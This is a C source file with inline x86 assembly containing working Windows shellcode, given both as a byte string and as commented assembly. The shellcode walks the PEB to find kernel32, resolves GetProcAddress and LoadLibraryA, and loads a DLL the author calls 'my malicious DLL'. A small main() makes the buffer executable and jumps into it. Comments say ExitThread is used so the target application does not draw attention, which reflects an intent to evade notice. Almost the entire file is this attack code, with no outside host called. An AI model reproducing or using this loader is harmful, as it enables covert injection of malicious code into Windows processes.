///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  Copyright © Aviv Shabtay 2020, All rights reserved
//
// THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
// ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO
// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
// PARTICULAR PURPOSE.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


#include <windows.h>
#include <stdio.h>

VOID ShellcodeF();

// Add extra NOP-Sled before the shellcode executing:
const char* shellcode = \
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// Start of the shellcode:
"\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x03\xd3"
"\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33\xc9\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75"
"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x03"
"\xf3\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x03\xf3\x8b\x14\x8e\x03\xd3\x33\xc9\x53\x52\x51\x68\x61"
"\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x51"
"\x66\xb9\x6c\x6c\x51\x68\x44\x4c\x2e\x64\x54\xff\xd0\x83\xc4\x10\x33\xc9\x5a\x5d\x66\xb9\x61"
"\x64\x51\x68\x54\x68\x72\x65\x68\x45\x78\x69\x74\x54\x53\xff\xd2\x83\xc4\x0c\x33\xc9\x51\xff"
"\xd0\x5e\x5b\x5d\xc3";

int main() {

	// Change the protection of the memory section contains the shellcode:
	DWORD old = 0;
	BOOL ret = VirtualProtect((LPVOID)shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &old);

	// Call the shellcode:
	__asm
	{
		jmp shellcode;
	}

	// Used when debugging the shellcode as assembly:
	//ShellcodeF();

	return 0;
}

/*
 * Shellcode used to load my malicious DLL (DL.dll) into memory.
*/
VOID ShellcodeF() {
	__asm {
		// Get PEB address with Null-Bytes:
		xor ecx, ecx;							// ECX = 0
		mov eax, fs : [ecx + 0x30] ;			// EAX = PEB base address (x86)

		// Get  DATA_LDT_PPEB (Ldr) base address:
		mov eax, [eax + 0xC];					// EAX = Ldr

		// Get kernel32 base address:
		mov esi, [eax + 0x14];					// ESI = InMemoryOrderModuleList
		lodsd;									// Load ESI into EAX - Get the second Module
		xchg eax, esi;							//
		lodsd;									// Load ESI into EAX - Get the third Module
		mov ebx, [eax + 0x10];					// EBX = Base Kernel32.dll address

		// Find the export directory:
		mov edx, [ebx + 0x3C];					// DOS -> e_lfanew
		add edx, ebx;							// EDX = PE Header
		mov edx, [edx + 0x78];					// Get the virualAddress to the offset of ExportDirectory
		add edx, ebx;							// EDX = ExportTable

		// Get the NameTable:
		mov esi, [edx + 0x20];					// ESI = Offset names table
		add esi, ebx;							// ESI = Names table

		// Search for LoadLibrary:
		xor ecx, ecx; // ecx = 0
	GetProcAdderss_Function:
		inc ecx;
		lodsd;									// Get Name offset
		add eax, ebx;							// Get Function name
		cmp dword ptr[eax], 0x50746547;			// "GetP" (Little Endian)
		jnz short GetProcAdderss_Function;
		cmp dword ptr[eax + 0x4], 0x41636f72;	// "rocA" (Little Endian)
		jnz short GetProcAdderss_Function;
		cmp dword ptr[eax + 0x8], 0x65726464;	// "ddre" (Little Endian)
		jnz short GetProcAdderss_Function;

		// Ordinal number of GetProcAddress function
		mov esi, [edx + 0x24];					// Offset Ordinals
		add esi, ebx;							// ESI = Ordinals table base address
		mov cx, [esi + ecx * 2];				// Multiple in 2 (the array contains two byte
												// numbers. CX= number of function)
		dec ecx;
		mov esi, [edx + 0x1c];					// ESI = offset of address table
		add esi, ebx;							// ESI = address table
		mov edx, [esi + ecx * 4];				// EDX = pointer (offset)- the array contains 4 byte values
		add edx, ebx;							// EDX = GetProcAddress

		// Find LoadLibrary
		xor ecx, ecx;							// ECX = 0
		push ebx;								// Kernel32 base address
		push edx;								// GetProcAddress
		push ecx;								// 0
		push 0x41797261;						// "aryA" (Little Endian)
		push 0x7262694c;						// "Libr" (Little Endian)
		push 0x64616f4c;						// "Load" (Little Endian)
		push esp;								// "LoadLibrary" full string from the entry point address
		push ebx;								// Kernel32 base address
		call edx;								// GetProcAddress(LL)

		// Load DL.dll (my malicious DLL file):
		add esp, 0xc;							//pop "LoadLibraryA"
		pop ecx;								//ECX = 0
		push eax;								//EAX = LoadLibraryA
		push ecx;
		mov cx, 0x6c6c;							// "ll" (Little Endian)
		push ecx;
		push 0x642e4c44;						// "DL.d" (Little Endian)
		push esp;								// "user32.dll"
		call eax;								// LoadLibrary("user32.dll")

		// Get ExitThread function address instead of ExitProcess.
		// Assumes the shellcode will run in separated thread
		// and we don't want it to trigger attentions if the application
		// we be closed.
		add esp, 0x10;							// Clean the stack
		xor ecx, ecx;							//ECX = 0
		pop edx;								// GetProcAddress
		pop ebp;								// Kernel32.dll base address
		mov cx, 0x6461;							// "aaad" (Little Endian)
		push ecx;
		push 0x65726854;						// "Thre" (Little Endian)
		push 0x74697845;						// "Exit" (Little Endian)
		push esp;								// "ExitThread"
		push ebx;								// Kernel32.dll base address
		call edx;								// execute GetProcAddress

		// Call the ExitThread function:
		add esp, 0xC;							// Clean the stack
		xor ecx, ecx;							// ECX = 0
		push ecx;								// Return code = 0
		call eax;								// ExitThread

		/*
		// In case we decide to terminate the process
		// after the DLL loaded we can use ExitProcess.
		// Get ExitProcess function address:
		add esp, 0x14;							// Clean the stack
		pop edx;								// GetProcAddress
		pop ebp;								// Kernel32.dll base address
		mov ecx, 0x61737365;					// essa
		push ecx;
		sub dword ptr[esp + 0x3], 0x61;			// Remove 'a'
		push 0x636f7250;						// Proc
		push 0x74697845;						// Exit
		push esp;								// "ExitProcess"
		push ebx;								// Kernel32.dll base address
		call edx;								// execute GetProcAddress


		// Call the ExitProcess function:
		add esp, 0x14;							// Clean the stack
		xor ecx, ecx;							// ecx = 0
		push ecx;								// Return code = 0
		call eax;								// ExitProcess
		*/
	}
}